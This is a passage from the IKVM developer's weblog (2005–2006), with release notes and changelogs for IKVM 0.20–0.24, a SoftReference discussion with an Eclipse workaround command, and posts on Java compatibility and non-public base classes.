<P><I>All soft references to softly-reachable objects are guaranteed to have been cleared before the virtual machine throws an <CODE>OutOfMemoryError</CODE>. Otherwise no constraints are placed upon the time at which a soft reference will be cleared or the order in which a set of such references to different objects will be cleared.</I></P>
<P>However, Eclipse depends on soft references not being cleared (at least during a particular window while it is starting up). I realised that always promoting the object to generation 2 is not correct either (because you may run out of memory before the object gets there). So considering the complexity and possible performance implications of the current hacks, I decided to simply never clear SoftReferences.</P>
<P>In conclusion, the .NET Framework needs something like soft reference support and until that happens, it won't be possible to implement SoftReference correctly and efficiently.</P>
<P><STRONG>Update:</STRONG> Nat points out in the comments that there is a workaround:</P><FONT size=2>
<P><EM>As a workaround, you can start up eclipse with the following command line</EM></P>
<P><EM>eclipse -vm c:\tools\ikvm-0.24.0.1\bin\ikvm.exe -vmargs -Declipse.noRegistryFlushing=true</EM></P></FONT>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/11/2006 13:52:02 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ec45dec2-ec22-4079-9b78-d06e15ddabe7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ec45dec2-ec22-4079-9b78-d06e15ddabe7">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 30 January 2006</h2></div>
<div class="newsItems"><a name="aa875bb80-77a4-450a-95a6-27d2305347f1"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.24 Released</h3>
	<div class="entryBody">
		<P>I released 0.24.0.1 to <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">SourceForge</A>. Jo&#227;o Saraiva reported that ikvmstub doesn't work correctly for mscorlib, but I've decided not to fix that for this version and instead make the correct mscorlib.jars available for download: <A href="http://www.frijters.net/mscorlib-1.1.jar">.NET 1.1</A> and <A href="http://www.frijters.net/mscorlib-2.0.jar">.NET 2.0</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/30/2006 09:12:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a875bb80-77a4-450a-95a6-27d2305347f1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a875bb80-77a4-450a-95a6-27d2305347f1">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 23 January 2006</h2></div>
<div class="newsItems"><a name="af065a334-b859-411c-8175-57e5534f02f8"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.24 rc2</h3>
	<div class="entryBody">
		<P>Jo&#227;o Saraiva reported a <A href="http://sourceforge.net/mailarchive/message.php?msg_id=14547202">bug</A> that I considered serious enough to fix for the 0.24 release, so here's a new release candidate. I also snuck in another AWT related fix.</P>
<P>Changes:</P>
<UL>
<LI>Changed WinForms event loop thread to STA.</LI>
<LI>Fixed handling of open generic types (by making sure they are invisible to Java code).</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.24.0.1.zip">ikvm-0.24.0.1.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.24.0.1.zip">ikvmbin-0.24.0.1.zip</A> (binaries), <A href="http://www.frijters.net/ikvmbin-generics-0.24.0.1.zip">ikvmbin-generics-0.24.0.1.zip</A> (binaries built from generics branch)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/23/2006 11:15:40 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f065a334-b859-411c-8175-57e5534f02f8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f065a334-b859-411c-8175-57e5534f02f8">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 16 January 2006</h2></div>
<div class="newsItems"><a name="a32025351-9dfb-4a8d-89ce-beb37c8fa2ad"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.24 rc1</h3>
	<div class="entryBody">
		<P>A new release candidate based on GNU Classpath 0.20 that was released this weekend. The GNU Classpath progress has been truly amazing. Updated japi results are available <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>. If no major bugs are found in this rc it will turn into a release, probably by the end of the week or early next week.</P>
<P>Note that while I did a little work to improve compatibility with the .NET Compact Framework, it is <B>not supported </B>and<B> does not work</B>. There is also no commitment from my end to work on this.</P>
<P>Changes:</P>
<UL>
<LI>Integrated <A href="http://www.gnu.org/software/classpath/announce/20060113.html">GNU Classpath 0.20</A></LI>
<LI>Changed nant build files to use NAnt 0.85-rc3 syntax and features</LI>
<LI>Removed support for compiling classpath with jikes</LI>
<LI>Added support for targetting both .NET 1.1 and .NET 2.0 to the build files</LI>
<LI>Removed assembly names from type names in map.xml (to better support targetting a different version of the CLR)</LI>
<LI>Added conditional compilation support to map.xml parser (based on target CLR version)</LI>
<LI>Changed map.xml Object.hashCode implementation to use RuntimeHelpers.GetHashCode when targetting .NET 2.0 (RuntimeHelpers.GetHashCode is broken on .NET 1.1 and the non-virtual call trick is no longer verifiable on .NET 2.0)</LI>
<LI>Added map.xml Object.equals implementation instead of relying on System.Object.Equals.</LI>
<LI>Changed map.xml VMSystem.identityHashCode to use RuntimeHelpers.GetHashCode when targetting .NET 2.0</LI>
<LI>Hardened VMSystemProperties to work better on the Compact Framework (where several methods are missing)</LI>
<LI>Fixed several NIO socket bugs</LI>
<LI>Changed FileChannelImpl to work on the Compact Framework (stdin, stdout and stderr are missing on the Compact Framework)</LI>
<LI>Hardened VMClassLoader to work better on the Compact Framework</LI>
<LI>Changed static compiler to use ReflectionOnly context for loading and generating assemblies (when compiled for .NET 2.0)</LI>
<LI>Added conditional compilation #ifs to the runtime to work better on the Compact Framework</LI>
<LI>Changed compilation of invokespecial bytecode to be verifiable on .NET 2.0</LI>
<LI>Added IKVM.Runtime.Util.GetInstanceTypeFromClass() to go from java.lang.Class to System.Type. Note that due to the object model mapping issues there is no one-to-one correspondence from Class to Type, so this method returns the "instance" type, which is logically equivalent to doing Class.newInstance().GetType().</LI>
<LI>Fixed ikvm.exe to give a proper error message when using the -jar option on a jar that doesn't have a manifest or a manifest that doesn't have a Main-Class attribute.</LI>
<LI>Added several hacks to ikvmc, ikvmstub and the runtime to support loading assemblies in the ReflectionOnly context.</LI>
<LI>Implemented optimization in compiler to remove redundant box/unbox operation is many cases.</LI>
<LI>Changed compiler to explicitly implement all inherited interfaces, for compatibility with the Compact Framework.</LI>
<LI>Fixed DotNetTypeWrapper.LoadTypeFromLoadedAssemblies to support generic type instantiations.</LI>
<LI>Optimized compiler to push/pop only the rightmost requires arguments when doing method argument conversions.</LI>
<LI>Implement "this" reference tracking in verifier, to enable code generator to emit more efficient (and verifiable on .NET 2.0) non-virtual base class method calls.</LI>
<LI>Optimized compiler to use short encoding when possible for backward branches.</LI>
<LI>Removed unnecessary verifier hack branch at the end of methods that don't use exception blocks and used short form of the branch.</LI>
<LI>Fixed Math.pow(1.0, Double.INFINITY) result on .NET 2.0.</LI>
<LI>Added SourceFileAttribute to module when running in dynamic mode, to enable source file reporting when running on .NET 2.0.</LI>
<LI>Changed code generator to leave out redundant branches.</LI>
<LI>Fixed infinite recursion in resource loading when SecurityManager is installed.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.24.0.0.zip">ikvm-0.24.0.0.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.24.0.0.zip">ikvmbin-0.24.0.0.zip</A> (binaries), <A href="http://www.frijters.net/ikvmbin-generics-0.24.0.0.zip">ikvmbin-generics-0.24.0.0.zip</A> (binaries built from generics branch)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/16/2006 15:15:07 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=32025351-9dfb-4a8d-89ce-beb37c8fa2ad"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=32025351-9dfb-4a8d-89ce-beb37c8fa2ad">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 24 December 2005</h2></div>
<div class="newsItems"><a name="a03fcab6a-4255-4967-a1ab-79a15db17ed0"></a><div class="entry">
	<h3 class="entryTitle">Getting Incorrect Code to Run Correctly</h3>
	<div class="entryBody">
		<P>One of the big challenges of doing a new implementation of an already existing platform is compatibility with the existing platform. Even though there is usually documentation or maybe even a specification that describes the functionality of the platform (and the things you can and cannot depend upon), in practice it turns out that much code that is written against a particular implementation will depend on implementation details. A typical response to this problem is: "That code is incorrect, because it makes assumptions that aren't guaranteed to hold."</P>
<P>The truth of the matter is, of course, that this issue isn't black and white. Sometimes the documentation or specification is vague or ambiguous, sometimes you need to depend on implementation details, because the documented interface simply isn't good enough or in many cases the dependency may simply be a bug in the code, but it's not always easy, desirable or even possible to fix the code.</P>
<P>Ultimately, when a customer has a piece of code that runs correctly on one implementation and it doesn't run on another implementation, the customer has a problem (and will in many cases assume that the problem is caused by the alternative implementation, since that's only thing that is being varied), so from a customer's point of view, supporting &#8220;incorrect&#8221; code can be a very important feature.</P>
<P>I've spent a lot of effort in IKVM to support incorrect code. Sometimes this can be <A HREF="/PermaLink.aspx?guid=245f4ca5-0512-4e66-a6c6-fa4d4af697ef"><STRONG>frustrating</STRONG></A>, but I realize that the value of IKVM is to a large degree proportional to its compatibility with Java.</P>
<P>Some people in the GNU Classpath community think that we should&nbsp;implement the specification as correctly and efficiently as possible, but I'm often arguing for compatibility with the Sun implementation, even if this means duplicating buggy or inefficient behavior. Obviously this is a tricky issue, because Sun fixes bugs and sometimes makes backward compatibility breaking changes as well, so in every case we need to figure out whether it is likely that Sun will ever fix the bug (or change the implementation) and whether the benefit outweighs the cost.</P>
<P>It's important to always keep in mind though, that &#8220;The Right Thing&#8221; from our geeky developer oriented view doesn't always align with our customer's expectations and I think that most FOSS projects could benefit from a little bit more customer oriented thinking every&nbsp;now and then.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/24/2005 13:01:15 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=03fcab6a-4255-4967-a1ab-79a15db17ed0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=03fcab6a-4255-4967-a1ab-79a15db17ed0">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 24 November 2005</h2></div>
<div class="newsItems"><a name="adfbe5a10-9bee-494b-a81a-f8d793f1ed70"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.22 Released</h3>
	<div class="entryBody">
		<P>I released 0.22 to <A href="http://sourceforge.net/project/showfiles.php?group_id=69637&amp;package_id=68631">SourceForge</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/24/2005 10:50:03 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=dfbe5a10-9bee-494b-a81a-f8d793f1ed70"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=dfbe5a10-9bee-494b-a81a-f8d793f1ed70">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 14 November 2005</h2></div>
<div class="newsItems"><a name="a968aa1b3-e0e8-4073-bcf2-268c92fbb3e0"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.22 rc1</h3>
	<div class="entryBody">
		<P>It took a little longer than usual, but I finally managed to put together rc1 of IKVM 0.22 based on <A href="http://www.gnu.org/software/classpath/announce/20051102.html">GNU Classpath 0.19</A>. For the first time, this release also includes binaries built from the GNU Classpath generics branch. Many thanks to Andrew John Hughes for doing the work that makes this possible.</P>
<P>Update japi results are available <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>.</P>
<P>Changes:</P>
<UL>
<LI>Integrated <A href="http://www.gnu.org/software/classpath/announce/20051102.html">GNU Classpath 0.19</A></LI>
<LI>Fixed bug <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1310397&amp;group_id=69637&amp;atid=525264">1310397</A>.</LI>
<LI>Implemented reading package metadata from MANIFEST.MF for ikvmc compiled code.</LI>
<LI>Fixed ClassCastException in ExceptionHelper when Throwable instance methods are called on not remapped .NET exception that was caught in non-Java code and passed through a Java exception handler.</LI>
<LI>Fixed bug reported in support request <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1280333&amp;group_id=69637&amp;atid=525265">1280333</A>.</LI>
<LI>Implemented RemappedTypeWrapper.Finish().</LI>
<LI>Implemented wakeup and waiting for empty list in classpath/gnu/java/nio/SelectorImpl.java</LI>
<LI>Fixed ikvmc resource compression bug that could cause last couple of bytes to fall off.</LI>
<LI>Added a META-INF/MANIFEST.MF to IKVM.GNU.Classpath.dll, so that Class.getPackage() returns the proper info for system classes.</LI>
<LI>Relaxed requirements for field and methods names (as per third edition VM specification).</LI>
<LI>Fixed runtime not to invoke user class loaders when instantiating an array type.</LI>
<LI>Improved weak reference support (improved performance and SoftReferences are not cleared as aggresively as before).</LI>
<LI>Fixed ikvmstub regression that caused .NET 2.0 generic types used by exported types not to be exported.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.22.0.0.zip">ikvm-0.22.0.0.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.22.0.0.zip">ikvmbin-0.22.0.0.zip</A> (binaries), <A href="http://www.frijters.net/ikvmbin-generics-0.22.0.0.zip">ikvmbin-generics-0.22.0.0.zip</A> (binaries built from generics branch)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/14/2005 12:08:37 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=968aa1b3-e0e8-4073-bcf2-268c92fbb3e0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=968aa1b3-e0e8-4073-bcf2-268c92fbb3e0">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 01 October 2005</h2></div>
<div class="newsItems"><a name="a23e34644-667a-43e5-a746-ef6fcf50d537"></a><div class="entry">
	<h3 class="entryTitle">GNU Classpath generics branch snapshot</h3>
	<div class="entryBody">
		<P>As promised a while ago, here is the first IKVM snapshot based on the GNU Classpath generics branch. Note that this does not indicate a commitment to base the next release on the generics branch. I will only start basing my releases on the generics branch when GNU Classpath developer snapshots for the generics branch will be made. I don't know of there is any plan to do so at this time.</P>
<P>New in this release is the ability to reflect on the Java 1.5 generic type information. Based on these new APIs ikvmstub can now roundtrip generic type information (remember, this is Java generics, not .NET generics) and thanks to <A href="http://sab39.dev.netreach.com/Blog/Blog/12/?pm=18&amp;vobId=266">Stuart</A>'s work on Japi we can now get a&nbsp;status of the GNU Classpath library and at the same time test the IKVM/Classpath reflection infrastructure and ikvmstub. Results are available <A href="http://www.frijters.net/JDK-1.5-vs-IKVM-0.21.0.0.html">here</A>.</P>
<P>The IKVM source + binaries&nbsp;snapshot is available <A href="http://www.frijters.net/ikvm-generics-20051001.zip">here</A>. This was build by specifying the &#8220;generics&#8221; target.&nbsp;Some of the changes in this version are only available when you build this target.</P>
<P>Changes:</P>
<UL>
<LI>Method.getModifiers() on ikvmc compiled code didn't return Modifier.SYNCHRONIZED for static synchronized methods.</LI>
<LI>Added support ceq IL instruction to remapper.</LI>
<LI>Added adhoc support for .NET type signatures in &lt;call /&gt; remapper instruction.</LI>
<LI>Improved build file support for building generics branch.</LI>
<LI>Added SignatureAttribute to various map.xml classes and methods.</LI>
<LI>Updated SharpZipLib to 0.84.</LI>
<LI>Added .NET attributes and support for capturing Java Signature and EnclosingMethod attributes.</LI>
<LI>Added support for mapping Java varargs methods onto .NET vararg methods (and v.v.).</LI></UL>
<P>Changes (&#8220;generics&#8221; build&nbsp;target only):</P>
<UL>
<LI>
<P style="FONT-SIZE: 10pt; MARGIN: 0in; FONT-FAMILY: Verdana; mso-outline-level: 1">Implemented support for 1.5 generic reflection methods.</P></LI>
<LI>
<P style="FONT-SIZE: 10pt; MARGIN: 0in; FONT-FAMILY: Verdana; mso-outline-level: 1">Added support to ikvmstub for roundtripping (Java) generics, enums, annotations, varargs and synthetic marker.</P></LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/01/2005 13:27:27 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=23e34644-667a-43e5-a746-ef6fcf50d537"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=23e34644-667a-43e5-a746-ef6fcf50d537">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 11 September 2005</h2></div>
<div class="newsItems"><a name="a169f3f8a-195f-486b-b630-e01f1aa9668d"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.20 Released</h3>
	<div class="entryBody">
		<P>I released 0.20 to <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">SourceForge</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/11/2005 16:39:33 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=169f3f8a-195f-486b-b630-e01f1aa9668d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=169f3f8a-195f-486b-b630-e01f1aa9668d">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 07 September 2005</h2></div>
<div class="newsItems"><a name="a31127809-ccda-474e-9140-7842336b9061"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.20 rc1</h3>
	<div class="entryBody">
		<P>A new release candidate based on yesterday's <A href="http://lists.gnu.org/archive/html/classpath/2005-09/msg00034.html">GNU Classpath 0.18 release</A>. Unless any showstoppers are found, these bits will become the official 0.20 release in a few days.</P>
<P>Update japi results are available <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>.</P>
<P>Changes:</P>
<UL>
<LI>Integrated <A href="ftp://ftp.gnu.org/pub/gnu/classpath/classpath-0.18.tar.gz">GNU Classpath 0.18</A></LI>
<LI>Fixed (previously unused) CountingILGenerator.BeginFaultBlock().</LI>
<LI>Added reusing temporary locals to compiler (to reduce file size).</LI>
<LI>Added optimization to compiler to remove recursive exception handlers that make synchronized block exit async safe (see <A HREF="/PermaLink.aspx?guid=3af9548e-4905-4557-8809-65a205ce2cd6">http://weblog.ikvm.net/PermaLink.aspx?guid=3af9548e-4905-4557-8809-65a205ce2cd6</A>).</LI>
<LI>Added optimization to compiler to turn synchronized block exit exception handlers into fault blocks.</LI>
<LI>Interned all member names and signatures (to save memory).</LI>
<LI>Interned type names.</LI>
<LI>Made some minor optimizations to class file parsing.</LI>
<LI>Stopped "normalizing" tableswitch instruction to lookupswitch (since the compiler treated them differently already).</LI>
<LI>Corrected "cannot throw" bytecode metadata flag for ifnonnull instruction.</LI>
<LI>Changed ByteCodeMetaData.CanThrowException() to take NormalizedByteCode.</LI>
<LI>Removed non-normalized bytecode from Instruction structure.</LI>
<LI>Added support for throwing NoClassDefFoundError when accessing a type that previously failed static initialization.</LI>
<LI>Changed ClassLoader.findLoadedClass to also find array classes made of classes that are already loaded (for compatibility with Sun JDK 1.4).</LI>
<LI>Changed ClassLoader &lt;-&gt; ClassLoaderWrapper association from hashtable to using the vmdata field in ClassLoader.</LI>
<LI>Rewrote large parts of class caching by the class loaders to be more spec compliant and more compatible with the Sun implementation for unspecified behavior.</LI>
<LI>Added class and baseclass name to VerifyError message when a class extends a final class.</LI>
<LI>Removed broken mechanism that tried to doom entire classes when a method was unverifiable, instead of throwing the VerifyError when the method is actually called.</LI>
<LI>Fixed bug that caused critical error when compiling a class that contains a package private method that overrides a protected method in a base class.</LI>
<LI>Added more info to some of the loader constraints violated exception messages.</LI>
<LI>Fixed ikvmc to continue compilation when encountering a class that cannot be loaded (due to inaccessible or final base classes).</LI>
<LI>Fixed various bugs in FileChannel.lock()/tryLock().</LI>
<LI>Fixed a verifier bug.</LI>
<LI>Added error message when a typename occurs in multiple referenced assemblies.</LI>
<LI>Fixed VMFile.mkdir NullPointerException when trying to create a root directory.</LI>
<LI>Added ClassFile.GetClassName() to be able to sniff class name from class definition without fully parsing the class definition.</LI>
<LI>Removed ability to parse java.lang.Object from ClassFile.</LI>
<LI>Removed OuterClass property from ClassFile.</LI>
<LI>Moved accidental Finish trigger detection from JavaTypeImpl.Finish to ClassLoaderWrapper.OnTypeResolve, to facilitate new "finish as we go" strategy used by ikvmc.</LI>
<LI>Fixed a couple of places in FieldWrappers where FieldInfo.FieldType was used (which isn't available anymore after we bash the contents of the FieldBuilders to save memory).</LI>
<LI>Enabled Reflection.Emit private field bashing hack to conserve memory for static compilation as well.</LI>
<LI>Introduced IKVM_DISABLE_TYPEBUILDER_HACK environment variable to disable the hack that bashes Reflection.Emit private fields to conserve memory.</LI>
<LI>Changed the way inner classes are resolved by ikvmc to facilitate new "finish as we go" strategy used by ikvmc.</LI>
<LI>Fixed subtle miranda method bug when dealing with loader constraint violations.</LI>
<LI>Fixed method generator to set MethodAttributes.NewSlot when a mangled method name is used to override a method.</LI>
<LI>Introduced JVM.FinishingForDebugSave to save memory, simplify code and fix a theoretical bug.</LI>
<LI>Moved bytecode error handling from compiler to verifier, so that the verifier can now accurately track what code is reachable (bytecode that gets compiled as an exception (e.g. NoSuchMethodError) typically results in unreachable code following that instruction). This change allows "broken" constructors to be compiled into verifiable CIL.</LI>
<LI>Moved array cloning hack (to workaround a bug javac) from compiler to verifier.</LI>
<LI>Fixed some unloadable type bugs.</LI>
<LI>Restructed verifier into two separate steps. The first step computes the stack and local variables types and the second step does the actual verification and reachability determination.</LI>
<LI>Changed jniproxy.dll (created with -Xsave) from module to assembly to make the main assembly verifiable.</LI>
<LI>Fixed stack walking to skip HideFromJava methods.</LI>
<LI>Fixed <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1257044&amp;group_id=69637&amp;atid=525264">bug 1257044</A>.</LI>
<LI>Moved Name and Signature to MemberWrapper.</LI>
<LI>Renamed MirandaMethodAttribute to HideFromReflectionAttribute.</LI>
<LI>Fixed ikvmc to only generate __Fields inner classes for public interfaces.</LI>
<LI>Added IKVM.Runtime.Util.GetFriendlyClassFromType() method. This is dumb name and subject to change.</LI>
<LI>Added (limited) support to remapper for adding methods to Java classes.</LI>
<LI>Added implicit conversion operator to java.lang.Class to convert from System.Type.</LI>
<LI>Optimized line number table encoding yet again.</LI>
<LI>Fixed bytecode compile to trigger class initializer for "new" bytecode and for accessing constant fields.</LI>
<LI>Changed class loading to reduce chance of inadvertantly hiding exceptions caused by bugs in the IKVM runtime.</LI>
<LI>Improved replacing of ClassNotFoundException with NoClassDefFoundError during class loading.</LI>
<LI>Made delegate helper interfaces private. This solves an incompatibility between ikvmc generated assemblies and C++/CLI, but ultimately this wasn't the reason for this change, the helper interfaces don't have type identity, so they shouldn't be used in public interfaces (preferably they should only be used in delegate instantiation).</LI>
<LI>Fixed class loading bugs that caused Class.forName("cli.java.lang.Object") and Class.forName("System.EventHandler$Method") to work.</LI>
<LI>Fixed ikvmc to no longer generate unused delegate helper interfaces.</LI>
<LI>Changed java.version system property to 1.4.2.</LI>
<LI>Fixed ikvmc to open input files as read-only.</LI>
<LI>Changed JNI methods GetPrimitiveArrayCritical/ReleasePrimitiveArrayCritical to allow up to two arrays to be pinned instead of copied.</LI>
<LI>Fixed compiler to mark all methods with MethodAttributes.HideBySig, to use correct method name resolution semantics when using an ikvmc generated assembly from C#.</LI>
<LI>Removed "ikvm.cleanstacktrace" system property and introduced IKVM_DISABLE_STACKTRACE_CLEANING environment variable to solve initialization order problem.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.20.0.0.zip">ikvm-0.20.0.0.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.20.0.0.zip">ikvmbin-0.20.0.0.zip</A> (binaries)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/07/2005 09:46:47 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=31127809-ccda-474e-9140-7842336b9061"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=31127809-ccda-474e-9140-7842336b9061">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 06 September 2005</h2></div>
<div class="newsItems"><a name="a7bc26de2-c5e7-4383-acec-541149a59d75"></a><div class="entry">
	<h3 class="entryTitle">Mono users meeting at the Microsoft PDC</h3>
	<div class="entryBody">
		For some reason, this year's Mono BoF proposal was again not accepted. Fortunately, Miguel organized an <A href="http://tirania.org/blog/archive/2005/Sep-06.html">alternative get together</A>. If you're going to the PDC and you're interested in running your .NET applications on non-Microsoft platforms or simply interested in the state of the leading Open Source CLI implementation, this is a must attend event.
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/06/2005 15:22:39 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7bc26de2-c5e7-4383-acec-541149a59d75"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7bc26de2-c5e7-4383-acec-541149a59d75">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 15 August 2005</h2></div>
<div class="newsItems"><a name="a6e2e2e90-1227-4705-96aa-924c69053ce4"></a><div class="entry">
	<h3 class="entryTitle">Revenge of the Non-Public Base Class</h3>
	<div class="entryBody">
		<P>I think I've previously written about the stupidity of allowing public classes to extend non-public classes and implement non-public interfaces, but unfortunately in Java we have to live with this.</P>
<P>Last week rnaylor filed a <A href="http://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=1257044&amp;group_id=69637">bug</A> that ikvmc created invalid code when calling public methods inherited from a non-public base class from another class (in another package).</P>
<P>A good example that is (sort of) equivalent to the problem in the bug report are the fields in the <CODE>java.util.zip.ZipConstants</CODE> interface. I'd link to the Javadoc for this interface, but it is a private type so there is no public documentation. However, this type still leaves it's marks on the public API, because several of the zip classes implement this interface. For example, <A href="http://java.sun.com/j2se/1.5.0/docs/api/java/util/zip/ZipFile.html">ZipFile</A> implements this interface and as a consequence it inherits a whole bunch of constants (i.e.&nbsp;public static final fields) that, as far as I can tell, serve no purpose whatsoever in the public API.</P>
<P>Before I checked in my fix yesterday, ikvmc didn't do anything special with these inherited fields or methods and because of this if you referenced these fields or methods from another assembly ikvmc would generate invalid code to access these members on the private base class and the .NET runtime would complain about this (by throwing System.MethodAccessException or System.FieldAccessException).</P>
